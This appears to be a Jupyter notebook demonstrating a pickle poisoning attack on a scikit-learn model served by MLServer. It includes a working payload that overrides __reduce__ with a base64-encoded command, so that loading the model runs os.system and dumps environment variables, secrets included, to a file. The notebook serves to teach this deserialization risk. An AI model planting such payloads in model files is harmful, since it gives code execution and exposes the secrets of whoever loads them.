# Poisoning Example

This notebook demonstrates a simple poisoning attach to generate a malicious artefact that dumps all the environment variables.

## Training

The first step will be to train a simple `scikit-learn` model.
For that, we will use the [MNIST example from the `scikit-learn` documentation](https://scikit-learn.org/stable/auto_examples/classification/plot_digits_classification.html) which trains an SVM model.


```python
# Original source code and more details can be found in:
# https://scikit-learn.org/stable/auto_examples/classification/plot_digits_classification.html

# Import datasets, classifiers and performance metrics
from sklearn import datasets, svm, metrics
from sklearn.model_selection import train_test_split

# The digits dataset
digits = datasets.load_digits()

# To apply a classifier on this data, we need to flatten the image, to
# turn the data in a (samples, feature) matrix:
n_samples = len(digits.images)
data = digits.images.reshape((n_samples, -1))

# Create a classifier: a support vector classifier
classifier = svm.SVC(gamma=0.001)

# Split data into train and test subsets
X_train, X_test, y_train, y_test = train_test_split(
    data, digits.target, test_size=0.5, shuffle=False)

# We learn the digits on the first half of the digits
classifier.fit(X_train, y_train)
```

### Saving our Trained Model

To save our trained model, we will serialise it using `joblib`.
While this is not a perfect approach, it's currently the recommended method to persist models to disk in the [`scikit-learn` documentation](https://scikit-learn.org/stable/modules/model_persistence.html).

Our model will be persisted as a file named `mnist-svm.joblib`


```python
import joblib

model_file_name = "./models/naive-model/model.joblib"
joblib.dump(classifier, model_file_name)
```


```python
open(model_file_name, 'rb').read()
```

## Serving

Next step will be to serve our un-tampered model to show it's working as expected.

For this, we will leverage [MLServer](mlserver.readthedocs.io/) - a simple inference server that ships a Scikit-Learn inference runtime out-of-the-box.
The only requirement will be to create a `model-settings.json` file that instructs MLServer to use the SKLearn runtime to serve this model.


```python
%%writefile models/naive-model/model-settings.json
{
    "name": "naive-model",
    "implementation": "mlserver_sklearn.SKLearnModel"
}
```

With our config file in place, the next step will be to start MLServer on a separate terminal with:

```bash
mlserver start ./models/naive-model
```

As we can see, the model gets loaded correctly, and can serve inference requests.


```python
import requests

from mlserver.types import InferenceResponse
from mlserver.codecs import NumpyRequestCodec

endpoint = "http://localhost:8080/v2/models/naive-model/infer"
req = NumpyRequestCodec.encode_request(X_test[0:1])
res = requests.post(endpoint, json=req.dict())

res.json()
inf_res = InferenceResponse(**res.json())
NumpyRequestCodec.decode_response(inf_res)
```

## Poisoning


```python
import types, os, base64

def __reduce__(self):
    # This is basically base64 for cmd = "env > pwnd.txt"
    cmd = base64.b64decode("ZW52ID4gcHduZC50eHQ=").decode() 
    return os.system, (cmd,)

classifier.__class__.__reduce__ = types.MethodType(__reduce__, classifier.__class__)
joblib.dump(classifier, model_file_name)
```


```python
with open(model_file_name, "rb") as f: print(f.readlines())
```

If we now try to reload our model, MLServer will (unknowingly) load the poisoned model which will - in turn - dump our entire environment (which could include passwords, etc.).


```python
import requests

endpoint = "http://localhost:8080/v2/repository/models/naive-model/load"
requests.post(endpoint)
```


```python
!head ./models/naive-model/pwnd.txt
```


```python

```
